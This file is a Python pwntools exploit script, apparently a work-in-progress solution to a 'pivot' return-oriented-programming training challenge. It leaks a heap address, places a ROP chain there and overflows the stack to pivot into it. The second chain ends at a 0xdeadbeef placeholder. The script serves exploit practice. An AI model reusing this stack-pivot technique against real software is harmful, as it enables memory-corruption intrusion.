from pwn import *

# stack offset to overwrite rip
stack_offset = 40

# static elf offsets
foothold_plt = 0x00400850
foothold_got = 0x00602048
puts_plt = 0x00400800
main = 0x00400996

# gadgets
# -------
# 0x0000000000400b02: xchg rax, rsp; ret;
# 0x0000000000400b00: pop rax; ret;

xchgret = 0x000400b02
poprax = 0x000400b00

# run target
p = process("./pivot")

# wait for debugger
pid = util.proc.pidof(p)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)

# process interaction
p.recvuntil("Call ret2win() from libpivot.so")

# read heap address
heap_addr = p.recvline_contains("The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(' ', 1)[1]
heap_addr = u64(unhex(heap_addr[2:]).rjust(8, '\x00'), endian='big')
log.info("Heap address: 0x%x" % heap_addr)

# construct ropchains
# stack pivot chain
ropchain =  p64(poprax)
ropchain += p64(heap_addr)
ropchain += p64(xchgret)

# main exploit chain in heap address
ropchain2 =  p64(foothold_plt)
ropchain2 += p64(0xdeadbeef)

buffer = "A"*stack_offset + ropchain

# send pivoted ropchain to heap address
log.info("Sending second chain to heap address...")
p.recvuntil("Send your second chain now and it will land there")
p.sendline(ropchain2)

# send pivot buffer overflow
log.info("Sending stack smash and chain to pivot to the heap address...")
p.recvuntil("Now kindly send your stack smash")
p.sendline(buffer)

p.interactive()
